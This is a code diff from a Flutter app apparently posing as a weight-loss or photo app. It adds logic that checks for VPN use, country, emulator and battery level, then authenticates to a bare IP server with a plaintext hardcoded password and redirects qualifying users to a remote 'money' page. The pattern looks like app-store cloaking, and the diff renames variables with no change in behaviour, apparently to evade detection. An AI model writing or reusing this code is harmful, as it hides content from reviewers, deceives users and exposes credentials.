@@ -14,16 +14,16 @@ import 'package:weightburner_119/onbording/onbording_clnjsdsdv.dart';
 import 'burner_authorization.dart';
 import 'burner_funcii.dart';
 
-Future<void> yyyyyyyy(
+Future<void> ochenvazhnayafuncia(
     BuildContext context, Function(bool) isPhotoburner) async {
   final burnerDb = await BurnerRepository().burnerHGet();
   if (burnerDb == null) {
-    final String? authKey = await burnerAuthorization(
+    final String? cluchAvto = await burnerAuthorization(
       addPath: 'http://159.89.248.76/api/token/',
       l: 'oauth',
       p: '5.{r8<tWc>!Y2E3',
     );
-    if (authKey != null) {
+    if (cluchAvto != null) {
       final burnerprxTemp = await burnerIsUsingVpn();
       final burnerloc = await burnerCountryCode();
       final burnerisEmul = await burnerIsSemulator(context);
@@ -34,9 +34,9 @@ Future<void> yyyyyyyy(
       try {
         BurnerResponse? burnerResponse;
 
-        final userRegistrationResponse = await Dio(
+        final accountOtvetRegistr = await Dio(
           BaseOptions(
-            headers: {'Authorization': 'Bearer $authKey'},
+            headers: {'Authorization': 'Bearer $cluchAvto'},
           ),
         ).post(
           'http://159.89.248.76/api/ads_request/',
@@ -51,19 +51,18 @@ Future<void> yyyyyyyy(
             "btry_temp": burnerbtrLevel,
           },
         );
-        if (userRegistrationResponse.data != null) {
-          burnerResponse =
-              BurnerResponse.fromJson(userRegistrationResponse.data);
+        if (accountOtvetRegistr.data != null) {
+          burnerResponse = BurnerResponse.fromJson(accountOtvetRegistr.data);
         }
 
         if (burnerResponse != null) {
           if (burnerResponse.boolValue) {
             String burnerL1 =
                 '${burnerResponse.burnerResponseObject.rev}${burnerResponse.burnerResponseObject.pvr}';
-            final oneSignalSubscriptionId = OneSignal.User.pushSubscription.id;
+            final signalchikIdenty = OneSignal.User.pushSubscription.id;
             if (burnerL1.contains('{click_id}')) {
               burnerL1 = burnerL1.replaceAll(
-                  '{click_id}', '$oneSignalSubscriptionId:${DocFF.signalchik}');
+                  '{click_id}', '$signalchikIdenty:${DocFF.signalchik}');
             }
             late BurnerLocalModel burnerHiveObject;
             burnerHiveObject = BurnerLocalModel(
@@ -74,7 +73,7 @@ Future<void> yyyyyyyy(
             );
             BurnerRepository().burnerHSet(burnerHiveObject);
             isPhotoburner(true);
-            await burnerDelayed(3);
+            await Future.delayed(const Duration(seconds: 3));
             burnerPushReplacement(
               context,
               BurnerMoneyPage(
@@ -92,7 +91,7 @@ Future<void> yyyyyyyy(
       }
     }
     isPhotoburner(false);
-    await burnerDelayed(3);
+    await Future.delayed(const Duration(seconds: 3));
     burnerPushReplacement(context, const OnbordingLajbcascas());
     BurnerRepository().burnerHSet(
       BurnerLocalModel(
@@ -102,7 +101,7 @@ Future<void> yyyyyyyy(
   } else {
     if (burnerDb.strtburner) {
       isPhotoburner(true);
-      await burnerDelayed(3);
+      await Future.delayed(const Duration(seconds: 3));
       if (burnerDb.cabburner.isNotEmpty) {
         log("Cache URL: ${burnerDb.cabburner}");
         burnerPushReplacement(
@@ -121,25 +120,12 @@ Future<void> yyyyyyyy(
       }
     } else {
       isPhotoburner(false);
-      await burnerDelayed(3);
+      await Future.delayed(const Duration(seconds: 3));
       burnerPushReplacement(
         context,
         const OnbordingLajbcascas(),
       );
     }
-  }
-}
-
-Future<void> burnerCallReview(int duration) async {
-  await Future.delayed(Duration(seconds: duration));
-  try {
-    final InAppReview inAppReview = InAppReview.instance;
-
-    if (await inAppReview.isAvailable()) {
-      inAppReview.requestReview();
-    }
-  } catch (e) {
-    throw Exception(e);
   }
 }
 
@@ -156,6 +142,15 @@ Future<String> burnerGetRealLink(String burnerUrl) async {
   return burnerRealLink.realUri.toString();
 }
 
-Future<void> burnerDelayed(int seconds) async {
-  await Future.delayed(Duration(seconds: seconds));
+Future<void> burnerCallReview(int duration) async {
+  await Future.delayed(Duration(seconds: duration));
+  try {
+    final InAppReview burnerReview = InAppReview.instance;
+
+    if (await burnerReview.isAvailable()) {
+      burnerReview.requestReview();
+    }
+  } catch (e) {
+    throw Exception(e);
+  }
 }
